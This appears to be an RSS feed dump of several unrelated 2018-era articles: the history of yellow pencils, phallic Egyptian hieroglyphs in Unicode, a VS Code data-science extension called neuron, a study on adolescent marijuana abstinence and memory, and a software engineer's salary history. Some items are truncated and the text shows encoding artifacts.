<title>Why Pencils Are Yellow (2017)</title>
<link>https://www.artsy.net/article/artsy-editorial-little-known-reason-pencils-yellow</link>
<guid isPermaLink="true" >https://www.artsy.net/article/artsy-editorial-little-known-reason-pencils-yellow</guid>
<description>&lt;div readability=&quot;39&quot;&gt;
&lt;p&gt;Visitors to the 1889 Exposition Universelle in Paris entered the fairgrounds under the shadow of the newly-built Eiffel Tower‚Äîa gleaming marvel of wrought iron lattice that stretched almost a thousand feet into the air. Once inside, they could gawk at a massive reconstruction of the Bastille or gasp as Annie Oakley demonstrated her legendary marksmanship in Buffalo Bill‚Äôs Wild West show.&lt;/p&gt;
&lt;p&gt;Amidst this myriad of spectacles was a rather less dramatic‚Äîbut no less influential‚Äîinnovation from a Czech manufacturing company named Hardtmuth Pencil. Its latest creation was formed, as all pencils are, of a graphite core housed in a protective wooden sheath. What stood out was its color‚ÄîHardtmuth‚Äôs ‚Äúluxury pencil‚Äù was painted yellow.&lt;/p&gt;
&lt;p&gt;Prior to 1889, the highest-quality pencils were left ‚Äúnatural polished.‚Äù Manufacturers usually painted their pencils if they were looking to cover up imperfections in the wood. Accordingly, typical paint colors were dark: purple, red, maroon, or black.&lt;/p&gt;
&lt;p&gt;But Hardtmuth was looking for a way to advertise the caliber of its graphite rather than its wood. ‚ÄúFor a long time the best graphite came from the west‚ÄîEngland, in particular,‚Äù explained Duke University professor Henry Petroski, author of &lt;em&gt;The Pencil: A History of Design and Circumstance&lt;/em&gt;. (The very first graphite deposit was discovered in Borrowdale, England, in 1564, centuries before yellow pencils arrived on the scene.) Although the British supply of graphite eventually ran out, soon ‚Äúa new and superior source was found in Siberia.‚Äù&lt;/p&gt;

<title>Unicode Dicks</title>
<link>https://www.revk.uk/2018/10/unicode-dicks.html</link>
<guid isPermaLink="true" >https://www.revk.uk/2018/10/unicode-dicks.html</guid>
<description>One of the things that has always slightly amused and puzzled me is that unicode lacks a &quot;cock&quot; glyph. I mean, it seems to have characters and symbols from modern and historic cultures and forms of writing, and surely cave men have been drawing dicks on cave walls for tens of thousands of years, so why is this missing?&lt;p&gt;I can only assume someone is being prudish, and oddly enough people have used the eggplant¬†üçÜ emoji for this, amongst others, so clearly there is a &quot;demand&quot; for this emoji.&lt;/p&gt;&lt;p&gt;What I never realised, until now, is there would appears to be one already, thanks to Egyptian Hieroglyphs!&lt;/p&gt;&lt;p&gt;There seem to be three of them!&lt;/p&gt;&lt;div&gt;&lt;span&gt;ìÇ∏ìÇπ ìÇ∫&lt;/span&gt;&lt;/div&gt;&lt;br/&gt;And for those of you on Windows with a censored font (what a thing!) this is what they look like.&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://3.bp.blogspot.com/-eL5uYschigc/W9m501E6q5I/AAAAAAAAHo8/gIiDg_MngawELXQsxSlqf3se4bfgplMlgCLcBGAs/s1600/Screenshot%2B2018-10-31%2Bat%2B14.14.02.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;227&quot; data-original-width=&quot;420&quot; height=&quot;172&quot; src=&quot;https://3.bp.blogspot.com/-eL5uYschigc/W9m501E6q5I/AAAAAAAAHo8/gIiDg_MngawELXQsxSlqf3se4bfgplMlgCLcBGAs/s320/Screenshot%2B2018-10-31%2Bat%2B14.14.02.png&quot; width=&quot;320&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;They are rather innocuously named¬†U+130B8: EGYPTIAN HIEROGLYPH D052,¬†U+130B9: EGYPTIAN HIEROGLYPH D052A, and¬†U+130BA: EGYPTIAN HIEROGLYPH D053.&lt;/p&gt;&lt;p&gt;I cannot actually work out what the middle one is meant to be doing, to be honest. Looks painful.&lt;/p&gt;&lt;p&gt;Someone will no doubt explain to me that in fact that is not what the hieroglyph is and that I just have a dirty mind, but if that were true, why are they apparently censored in some fonts?&lt;/p&gt;&lt;p&gt;Reference:¬†&lt;a href=&quot;http://xahlee.info/comp/unicode_egyptian_hieroglyph.html&quot;&gt;http://xahlee.info/comp/unicode_egyptian_hieroglyph.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Who knew?!&lt;/p&gt;&lt;p&gt;P.S. Why was I looking for unicode dicks? I was not, but was checking if hieroglyphs worked on my new card printing system, and to my surprise, they do! May have to be time for a new SSID I think :-)&lt;/p&gt;&lt;p&gt;P.P.S. (yes, all the daft ones are on 2.4GHz so don't impact any of our devices)&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://3.bp.blogspot.com/-WEsxF9KkmY8/W9nYpDVP17I/AAAAAAAAHpI/wKjiIoqevUoIqz4JdTUw--Xdir1oGs-wwCLcBGAs/s1600/IMG_1383.jpg&quot; imageanchor=&quot;1&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;1402&quot; data-original-width=&quot;1125&quot; height=&quot;400&quot; src=&quot;https://3.bp.blogspot.com/-WEsxF9KkmY8/W9nYpDVP17I/AAAAAAAAHpI/wKjiIoqevUoIqz4JdTUw--Xdir1oGs-wwCLcBGAs/s400/IMG_1383.jpg&quot; width=&quot;320&quot;/&gt;&lt;/a&gt;&lt;/div&gt;

<title>Neuron, a new VS Code extension for data science</title>
<link>https://blogs.msdn.microsoft.com/uk_faculty_connection/2018/10/29/data-science-in-visual-studio-code-using-neuron-a-new-vs-code-extension/</link>
<guid isPermaLink="true" >https://blogs.msdn.microsoft.com/uk_faculty_connection/2018/10/29/data-science-in-visual-studio-code-using-neuron-a-new-vs-code-extension/</guid>
<description>&lt;p&gt;Guest post by &lt;a href=&quot;https://www.linkedin.com/in/silvestri-lorenzo&quot;&gt;Lorenzo Silvestri&lt;/a&gt;, Electronic and Information Engineering Student at Imperial College London.&lt;br/&gt;&lt;/p&gt;
&lt;h3&gt;Introduction&lt;/h3&gt;
&lt;p&gt;In this post, I‚Äôll give a short explanation of &lt;em&gt;neuron&lt;/em&gt;, a Visual Studio Code extension that aims to be a one-stop-shop for data scientists. It‚Äôs an extension I developed as part of a team of students at Imperial College London, in collaboration with Microsoft, in the summer of 2018.&lt;br/&gt;&lt;/p&gt;
&lt;h3&gt;A bit of context ‚Äì a.k.a. why &lt;em&gt;neuron&lt;/em&gt; exists in the first place&lt;/h3&gt;
&lt;p&gt;Data science is the buzz-word of the 21&lt;sup&gt;st&lt;/sup&gt; century. From IoT devices generating thousands of data points per day, to social media connecting people‚Äôs information on a scale never seen before, a lot of the development that goes on today sooner or later comes into contact with ‚Äúdata science‚Äù.&lt;/p&gt;
&lt;p&gt;Data scientists come from various different technical backgrounds, but the vast majority of them use a standard set of tools of the trade: Python, &lt;em&gt;&amp;lt;insert name of trending machine-learning library&lt;/em&gt;&amp;gt;, and Jupyter Notebooks.&lt;/p&gt;
&lt;p&gt;So Microsoft approached us with an idea. Can we integrate all of these tools into a single, intuitive workspace? More specifically, can we create an extension to Visual Studio Code that provided ways to run data analysis directly next to the code, without breaking the developer‚Äôs workflow?&lt;/p&gt;
&lt;p&gt;The benefits of this are obvious. You get the power of an intelligent Python editor (Visual Studio Code), combined with the rapidity of execution and visualisation abilities of Jupyter Notebooks. All in a single window. Thus, &lt;em&gt;neuron&lt;/em&gt; was born.&lt;br/&gt;&lt;/p&gt;
&lt;h3&gt;What &lt;em&gt;neuron&lt;/em&gt; does, and how to use it&lt;/h3&gt;
&lt;p&gt;The principle of &lt;em&gt;neuron&lt;/em&gt; is dead simple. You start off with your regular Python or R code editor ‚Äì the bit you type code into ‚Äì inside Visual Studio Code. Alongside it, taking up the other half of the screen, is &lt;em&gt;neuron&lt;/em&gt;. It‚Äôs a blank page at first, but as you run snippets of your code, the output gets turned into interactive cards. They can be plain text, tables, images, graphs, maps‚Ä¶ you name it. Here‚Äôs a first look:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image0022.png&quot;&gt;&lt;img width=&quot;826&quot; height=&quot;536&quot; title=&quot;clip_image002&quot; alt=&quot;clip_image002&quot; src=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image002_thumb2.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;br/&gt;&lt;/p&gt;
&lt;h4&gt;1. Installing the extension&lt;/h4&gt;
&lt;p&gt;You can find &lt;em&gt;neuron&lt;/em&gt; on the marketplace at &lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=neuron.neuron-IPE&quot;&gt;https://marketplace.visualstudio.com/items?itemName=neuron.neuron-IPE&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Once installed, a button will come up in the editor pane whenever you‚Äôre editing a supported file (currently, Python or R).&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image0043.png&quot;&gt;&lt;img width=&quot;605&quot; height=&quot;62&quot; title=&quot;clip_image004&quot; alt=&quot;clip_image004&quot; src=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image004_thumb3.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Clicking it will bring up the main &lt;em&gt;neuron&lt;/em&gt; output pane, and you‚Äôre good to go.&lt;br/&gt;&lt;/p&gt;
&lt;h4&gt;2. Setting up&lt;/h4&gt;
&lt;p&gt;The extension uses Jupyter Notebooks in the background to produce the visualisations that you know and love. If you‚Äôre a data scientist, chances are you already have Jupyter installed on your machine. If not, &lt;em&gt;neuron&lt;/em&gt; will offer to install it for you when you first open the extension.&lt;br/&gt;&lt;/p&gt;
&lt;h4&gt;3. Using the interface&lt;/h4&gt;
&lt;p&gt;The first step is to write some code. The extension currently supports Python and R, as they are the two most common languages used by data scientists. Let‚Äôs open a new Python file and write some code:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image0064.png&quot;&gt;&lt;img width=&quot;850&quot; height=&quot;455&quot; title=&quot;clip_image006&quot; alt=&quot;clip_image006&quot; src=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image006_thumb4.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Not exactly Big Data, but you get the idea. To run this code and get the output, all we need to do is select it and hit &lt;strong&gt;Alt+Enter&lt;/strong&gt; (&lt;strong&gt;option+return&lt;/strong&gt; on Macs). You can also right-click on your selection and select ‚ÄúSend code to output pane‚Äù, if you prefer.&lt;/p&gt;
&lt;p&gt;And‚Ä¶ here it is!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image0083.png&quot;&gt;&lt;img width=&quot;855&quot; height=&quot;536&quot; title=&quot;clip_image008&quot; alt=&quot;clip_image008&quot; src=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image008_thumb3.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A card with the output of your code appears on the right-hand side. You can delete it, move it up and down the list, minimise it, or expand it into a separate window. Neuron keeps track of the code snippets associated with each card, so that you can keep track of them and re-run them if needed.&lt;br/&gt;&lt;/p&gt;
&lt;h4&gt;4. Moving on to richer outputs&lt;/h4&gt;
&lt;p&gt;Complicated visualisation of data is where &lt;em&gt;neuron&lt;/em&gt; really shines. It supports more output types than Jupyter Notebooks!&lt;/p&gt;
&lt;p&gt;For example, a standard way of creating graphs in Python is through the popular library &lt;em&gt;plotly&lt;/em&gt;. Let‚Äôs try plotting some simple data points on a 2D plane.&lt;/p&gt;
&lt;p&gt;from plotly.offline import download_plotlyjs, init_notebook_mode, plot, iplot&lt;/p&gt;
&lt;p&gt;from plotly.graph_objs import Scatter, Figure, Layout&lt;/p&gt;
&lt;p&gt;iplot([{&quot;x&quot;: [1, 2, 3, 4, 5, 6, 7, 8], &quot;y&quot;: [0, 1, 1, 2, 2, 3, 3, 4]}])&lt;/p&gt;
&lt;p&gt;Once again, select the text, hit &lt;strong&gt;Alt+Enter&lt;/strong&gt;, and the card is generated.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image0102.png&quot;&gt;&lt;img width=&quot;852&quot; height=&quot;1059&quot; title=&quot;clip_image010&quot; alt=&quot;clip_image010&quot; src=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image010_thumb2.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The card is interactive, so you can zoom and pan as necessary, as well as mark values on the graph or export the image to a PNG. If you want to edit the data points, all you need to do is go back to your original code, change some values, and run it again. The new card will appear just below the old one: &lt;em&gt;neuron&lt;/em&gt; keeps track of your code‚Äôs history until you close Visual Studio.&lt;/p&gt;
&lt;p&gt;Neuron also supports 3D graphs, geographical maps, LaTeX formulas, markdown, HTML, and various static image types. The steps to generate them are the same as what I‚Äôve demonstrated above, and you can find examples of all of them in our demo file below.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image0122.png&quot;&gt;&lt;img width=&quot;786&quot; height=&quot;1135&quot; title=&quot;clip_image012&quot; alt=&quot;clip_image012&quot; src=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image012_thumb2.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image014.png&quot;&gt;&lt;img width=&quot;855&quot; height=&quot;408&quot; title=&quot;clip_image014&quot; alt=&quot;clip_image014&quot; src=&quot;https://msdnshared.blob.core.windows.net/media/2018/10/clip_image014_thumb.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;5. Try it yourself&lt;/h4&gt;
&lt;p&gt;If you‚Äôre looking for a hands-on tutorial to get started with &lt;em&gt;neuron&lt;/em&gt;, try our demo file that walks you through &lt;em&gt;neuron&lt;/em&gt;‚Äôs most useful features: &lt;a href=&quot;https://github.com/lorenzo2897/vscode-ipe/blob/master/test/demo.py&quot;&gt;https://github.com/lorenzo2897/vscode-ipe/blob/master/test/demo.py&lt;/a&gt;&lt;br/&gt;&lt;/p&gt;
&lt;h3&gt;Tips and tricks&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Filtering your output cards:&lt;/strong&gt; the list of cards can get a bit overwhelming to navigate if you‚Äôve been running lots of code snippets. Filter the cards by keywords or by card type, using the search box and the filter button in the toolbar of the output pane.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Is Jupyter acting up?&lt;/strong&gt; If you‚Äôre getting strange and inconsistent errors when running your Python code, it might be helpful to restart the Jupyter instance running in the background. There‚Äôs an option in the command palette called ‚ÄúIPE: Restart active kernels‚Äù that does just that.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sharing your output with others:&lt;/strong&gt; &lt;em&gt;neuron&lt;/em&gt; supports interoperability with Jupyter notebooks. You can import an existing notebook using the ‚ÄúIPE: Import Jupyter notebook‚Äù command, and it will convert all Jupyter cells to cards. Likewise, you can export the state of your output pane into a notebook, via the ‚ÄúExport‚Äù button in the extension‚Äôs toolbar.&lt;br/&gt;&lt;/p&gt;
&lt;h3&gt;Conclusion&lt;/h3&gt;
&lt;p&gt;I‚Äôm really excited to share with you that Microsoft has decided to integrate the work that we did in &lt;em&gt;neuron&lt;/em&gt; into the Python extension for Visual Studio Code. You can track the project‚Äôs progress at the Python extension‚Äôs &lt;a href=&quot;https://emea01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2FMicrosoft%2Fvscode-python&amp;amp;data=02%7C01%7Cleestott%40microsoft.com%7C7437400eef1f43dbeb2208d63f69571b%7C72f988bf86f141af91ab2d7cd011db47%7C1%7C0%7C636766119012741564&amp;amp;sdata=sTyOq0ZOT0D6yaDjrSzNxENMWzbzoT1IhlvchvwdRns%3D&amp;amp;reserved=0&quot;&gt;Github repository&lt;/a&gt;. I look forward to seeing what you create with it!&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Marijuana, it seems, is not a performance-enhancing drug. That is, at least, not among young people, and not when the activity is learning.&lt;/p&gt;
&lt;p&gt;A study &lt;a href=&quot;https://www.psychiatrist.com/JCP/article/Pages/2018/v79/17m11977.aspx&quot;&gt;published Tuesday&lt;/a&gt; in the &lt;em&gt;Journal of Clinical Psychiatry&lt;/em&gt; finds that when adolescents stop using marijuana ‚Äî even for just one week ‚Äî their verbal learning and memory improve. The study contributes to growing &lt;a href=&quot;https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3930618/&quot;&gt;evidence that marijuana use in adolescents&lt;/a&gt; is associated with reduced neurocognitive functioning.&lt;/p&gt;
&lt;p&gt;More than 14 percent of students in middle school and high school reported using marijuana within the past month, finds a &lt;a href=&quot;http://www.monitoringthefuture.org/pubs/monographs/mtf-overview2017.pdf&quot;&gt;National Institutes of Health survey&lt;/a&gt; conducted in 2017. And marijuana use has increased among high-schoolers over the past 10 years, according to the &lt;a href=&quot;https://www.hhs.gov/ash/oah/adolescent-development/substance-use/marijuana/index.html&quot;&gt;U.S. Department of Health &amp;amp; Human Services&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;At the same time, the percentage of teens who believe that regular marijuana use poses a great risk to their health has &lt;a href=&quot;http://www.monitoringthefuture.org/pubs/monographs/mtf-vol2_2016.pdf&quot;&gt;dropped sharply since the mid-2000s&lt;/a&gt;. And legalization of marijuana may play a part in shaping how young people think about the drug. One study noted that &lt;a href=&quot;https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5365078/&quot;&gt;after 2012, when marijuana was legalized&lt;/a&gt; in Washington state, the number of eighth-graders there that believed marijuana posed risks to their health dropped by 14 percent.&lt;/p&gt;
&lt;aside id=&quot;ad-backstage-wrap&quot; aria-label=&quot;advertisement&quot;&gt;
&lt;/aside&gt;&lt;p&gt;Researchers are particularly concerned with marijuana use among the young because THC, the active ingredient in marijuana, most sharply affects the parts of the brain that develop during adolescence.&lt;/p&gt;
&lt;p&gt;&quot;The adolescent brain is undergoing significant neurodevelopment well into the 20s, and the regions that are last to develop are those regions that are most populated by cannabis receptors and are also very critical to cognitive functioning,&quot; says &lt;a href=&quot;http://www.mghaddictionmedicine.com/about/staff/randi-schuster-ph-d/&quot;&gt;Randi Schuster&lt;/a&gt;. Schuster is the director of neuropsychology at Massachusetts General Hospital's Center for Addiction Medicine and the study's lead author.&lt;/p&gt;
&lt;p&gt;Schuster and the team of researchers set out to determine if cognitive functions that are potentially harmed by marijuana use in adolescents ‚Äî particularly attention and memory ‚Äî improve when they abstain from marijuana.&lt;/p&gt;
&lt;p&gt;They recruited 88 pot-using teens and young adults, ages 16 to 25, and got some of them to agree to stop smoking (or otherwise consuming) marijuana for the month.&lt;/p&gt;
&lt;p&gt;Schuster says the researchers wanted to recruit a range of participants, not just heavy users or those in a treatment program, for example. Some of the young people smoked once per week; some smoked nearly daily.&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The researchers randomly assigned the volunteers into an abstaining group and a nonabstaining group. They delivered the bad news to those chosen to be abstainers at the end of their first visit, and Schuster says, they took it surprisingly well.&lt;/p&gt;
&lt;p&gt;&quot;People were generally fine,&quot; she says. &quot;We kind of went through what the next month would look like and helped them come up with strategies for staying abstinent.&quot;&lt;/p&gt;
&lt;p&gt;One motivation for the non-tokers to stick with the program? They received increasing amounts of money each week of the month-long study.&lt;/p&gt;
&lt;p&gt;The researchers urine-tested both groups on a weekly basis to make sure that the THC levels for the abstinent group were going down, and that the levels for the control group were staying consistent as they continued using.&lt;/p&gt;
&lt;p&gt;Also at each visit, the participants completed a variety of tasks testing their attention and memory through the &lt;a href=&quot;http://www.cambridgecognition.com/cantab/&quot;&gt;Cambridge Neuropsychological Test Automated Battery&lt;/a&gt;, a validated cognitive assessment tool.&lt;/p&gt;
&lt;p&gt;The researchers found that after four weeks, there was no noticeable difference in attention scores between the marijuana users and the nonusers. But, the memory scores of the nonusers improved, whereas the users' memories mostly stayed the same.&lt;/p&gt;
&lt;p&gt;The verbal memory test challenged participants to learn and recall new words, which &quot;lets us look both at their ability to learn information the first time the words were presented, as well as the number of words that they're able to retrieve from long-term memory storage after a delay,&quot; Schuster says.&lt;/p&gt;
&lt;p&gt;Verbal memory is particularly relevant for adolescents and young adults when they're in the classroom, Schuster says.&lt;/p&gt;
&lt;p&gt;&quot;For an adolescent sitting in their history class learning new facts for the first time, we're suspecting that active cannabis users might have a difficult time putting that new information into their long-term memory,&quot; Schuster says.&lt;/p&gt;
&lt;p&gt;While this study didn't prove that abstaining from cannabis improves adolescents' attention, other studies have found that &lt;a href=&quot;https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3930618/&quot;&gt;marijuana users fare worse in attention tests&lt;/a&gt; than nonusers. Schuster hypothesizes it might take more than four weeks of abstinence for attention levels to improve.&lt;/p&gt;
&lt;p&gt;Interestingly, most of the memory improvement for the abstinent group happened during the first week of the study, which leaves the researchers feeling hopeful.&lt;/p&gt;
&lt;p&gt;&quot;We were pleasantly surprised to see that at least some of the deficits that we think may be caused by cannabis appear to be reversible, and at least some of them are quickly reversible, which is good news,&quot; Schuster says.&lt;/p&gt;
&lt;p&gt;One weakness of this study is its lack of a non-marijuana-using control group, says &lt;a href=&quot;https://uwm.edu/psychology/people/lisdahl-krista-m/&quot;&gt;Krista Lisdahl&lt;/a&gt;, an associate professor of psychology at the University of Wisconsin Milwaukee who was not involved with the study but also researches the neuroscience of addiction. Because of this, it's difficult to conclude whether the improvements in memory brought the participants back to their baseline levels prior to using marijuana.&lt;/p&gt;
&lt;p&gt;Also, because the study lasted only four weeks, it's impossible to draw conclusions about the long-term effects of marijuana usage for young people, such as how marijuana directly affects academic performance, sleep patterns or mood.&lt;/p&gt;
&lt;p&gt;Lisdahl says that longitudinal studies such as the NIH's &lt;a href=&quot;https://abcdstudy.org/&quot;&gt;Adolescent Brain Cognitive Development Study&lt;/a&gt; could provide more information about what marijuana does to the adolescent brain. It might also reveal what happens if adolescents stop using marijuana and if their brain functioning can completely recover.&lt;/p&gt;
&lt;p&gt;Lisdahl is helping with the NIH study, which has, to date, enrolled more than 11,000 children ages 9 and 10 and will follow them into young adulthood. It's the largest long-term research study on child brain development in the U.S., and it assesses how everything from screen time to concussions to drugs affect adolescents' brains.&lt;/p&gt;
&lt;p&gt;In the meantime, Lisdahl says the findings from the new study ‚Äî that abstinence from marijuana is associated with improvements in adolescents' learning and memory ‚Äî sends a positive message.&lt;/p&gt;
&lt;p&gt;&quot;I remain optimistic that we can show recovery of function with sustained abstinence,&quot; she says.&lt;/p&gt;

<title>My somewhat complete salary history as a software engineer</title>
<link>https://humanwhocodes.com/blog/2018/10/my-somewhat-complete-salary-history-software-engineer/</link>
<guid isPermaLink="true" >https://humanwhocodes.com/blog/2018/10/my-somewhat-complete-salary-history-software-engineer/</guid>
<description>&lt;p&gt;It‚Äôs 2018 and somehow women are still getting paid less than men, even in supposedly progressive industries like software.[1] Whether that be from companies offering women less than men for the same position, women being less likely to negotiate or less successful in negotiations, or any of the other myriad reasons, the results are still the same: women make less than men for the same job. That‚Äôs something that shouldn‚Äôt be happening in today‚Äôs world and it‚Äôs up to us (read: men) to step up and make things right. This is my attempt to do just that.&lt;/p&gt;&lt;h2 id=&quot;why-am-i-doing-this&quot;&gt;Why am I doing this?&lt;/h2&gt;
&lt;p&gt;Longtime followers know that I‚Äôve been dealing with serious health issues for several years. Two and a half years ago I had to stop working to focus on my health and it will likely be a couple more years before I‚Äôm able to even consider working a full-time job again. The people responsible for my last compensation package have long since left that company. That puts me in a unique position where I am not beholden to any past employers, and any future employers are far enough into the future that the information I‚Äôm sharing here will be mostly useless by then. Plus, as a white man, I know I‚Äôm going to be able to negotiate for my salary without backlash[2] when I do start working again. As such, the information in this post is more valuable to others than it is to me.&lt;/p&gt;
&lt;p&gt;As an aside, I‚Äôve been annoyed that throughout my career I‚Äôve been lectured many times to avoid discussing my compensation with colleagues. Usually it‚Äôs with the warning that, ‚Äúnot everyone is getting what you‚Äôre getting, and we don‚Äôt want to hurt feelings.‚Äù It took me a long time to realize that the ‚Äúhurt feelings‚Äù they‚Äôre talking about come from an overall lack of transparency into the compensation process, and that simply explaining why people are compensated in certain ways would be a better solution than to hide all of the information from everyone. Yes, there will always be people who think they deserve to be making more but who don‚Äôt actually deserve it. That seems like a great way to communicate that they aren‚Äôt doing a good enough job and figure out ways to improve.&lt;/p&gt;
&lt;p&gt;The bottom line is that nothing gets better unless people are willing to share information. And while I could just share my last salary, I don‚Äôt think that‚Äôs very useful, especially when compared with the variety of already-available sources of information online. No, to be useful, I felt like I would need to reveal my entire salary history so people can determine for themselves if they‚Äôre seeing enough improvement in their salaries over time.&lt;/p&gt;
&lt;h2 id=&quot;where-did-this-data-come-from&quot;&gt;Where did this data come from?&lt;/h2&gt;
&lt;p&gt;The data in this post comes from the following sources:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;My memory. Yes, memory is fallible, but there are some data points that are so important on an emotional level that they tend to stick in my brain. I‚Äôll point those out.&lt;/li&gt;
&lt;li&gt;Offer letters. As my offer letters post-2006 were always emailed to me, I‚Äôve been able to be 100% sure of those details. Prior to 2006, my offer letters were always mailed to me, and I have no record of those.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Where my memory fails me and I don‚Äôt have an offer letter, I‚Äôve made an attempt to guess the salary range I had at the time.&lt;/p&gt;
&lt;h2 id=&quot;the-data&quot;&gt;The data&lt;/h2&gt;
&lt;p&gt;The table below contains all of my salary (and some other compensation history). I‚Äôm including what I believe to be data relevant to evaluating the compensation include the year I received the salary, the years of experience I had at the time (&lt;strong&gt;YOE&lt;/strong&gt;), the starting and ending salary to take into account raises, and any signing bonus (&lt;strong&gt;Signing $&lt;/strong&gt;) and stock options (&lt;strong&gt;Options&lt;/strong&gt;) I might have received. Any amount with a question mark indicates that I‚Äôm guessing. I did not include any restricted stock units I might have received because I only ever received them at Yahoo as part of my initial offer.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Year&lt;/th&gt;

&lt;td&gt;$208,000&lt;/td&gt;
&lt;td&gt;$220,000&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 id=&quot;job-details&quot;&gt;Job Details&lt;/h2&gt;
&lt;p&gt;The data alone doesn‚Äôt really tell the full story, so here are the details around each position. I‚Äôve also included how I came to work at each company, as I think it‚Äôs important to recognize blind resume submissions from having contacts as a company.&lt;/p&gt;
&lt;p&gt;In 2006, I moved from Massachusetts to California. This undoubtedly affected my pay positively due to the higher cost of living in California. At one point, my manager mentioned that if I moved back to Massachusetts, I should expect a 10% pay cut due to cost of living differences. I‚Äôm still in California, so I have no idea if that was accurate.&lt;/p&gt;
&lt;h3 id=&quot;radnet-2000-2001&quot;&gt;Radnet (2000-2001)&lt;/h3&gt;
&lt;p&gt;My first job out of college was at a small startup in Wakefield, MA called Radnet, Inc. I got this job because the woman who used to babysit me as a child was running human resources at the company. My official title was webmaster, and I thought I would be coming in to run the company website. As it turned out, between the time they offered me the job and my starting day, they had hired someone to oversee both UI development and the website. As it turned out, I would never manage the website and instead would spend time making JavaScript components for the company‚Äôs web application.&lt;/p&gt;
&lt;p&gt;I know that my starting salary was $48,000 (about $70,284 in 2018 dollars) because I was very excited about it. After spending summers working jobs that ranged from $2/hour to $6/hour, this seemed like an incredible amount of money to me. A few months in, they gave me a raise to $55,000 because I was doing a good job. Towards the end of 2000, they believed the company would be bought and so they changed my title to UI Developer and upped my salary to $62,500 with the belief that an acquirer would immediately fire the ‚Äúwebmaster‚Äù and ensuring I‚Äôd benefit from the acquisition.&lt;/p&gt;
&lt;p&gt;As it turned out, the company never got bought and so it shutdown in January 2001. I never really saw much of the $62,500, and eight months after I had started my first job, I was unemployed.&lt;/p&gt;
&lt;p&gt;The job itself was pretty low-stress. I worked an even 40 hours per week during my eight months there, and never once worked on a weekend.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; I did receive stock options for this position, but I don‚Äôt remember what they were. I didn‚Äôt really understand what stock options were at the time so that information never stuck in my brain.&lt;/p&gt;
&lt;h3 id=&quot;matrixone-2001-2005&quot;&gt;MatrixOne (2001-2005)&lt;/h3&gt;
&lt;p&gt;When Radnet closed down, my manager ended up at MatrixOne and asked if I would like to join him. I had enjoyed working with him at Radnet so I accepted. It‚Äôs important to understand that this was during the dot-com crash and there weren‚Äôt a lot of tech jobs to be had in Massachusetts at the time. I considered myself lucky to have formed a good relationship that allowed me to find a new job fairly quickly after Radnet shut down.&lt;/p&gt;
&lt;p&gt;I don‚Äôt remember all of the details but I‚Äôm pretty sure my starting salary was close to $68,000 ($96,814 in 2018 dollars). I‚Äôm also reasonably certain that I got a small signing bonus, maybe around $2,000, that my manager negotiated for me. I also received some stock options, but once again, I didn‚Äôt really understand what they were and so didn‚Äôt even register them as part of my compensation. It didn‚Äôt matter, though, because the company stock was never again as high as the day I joined. I was never able to exercise options, even when I got some repriced options later in my career there because the stock only ever went down. (Eventually the company would be bought out by a competitor.)&lt;/p&gt;
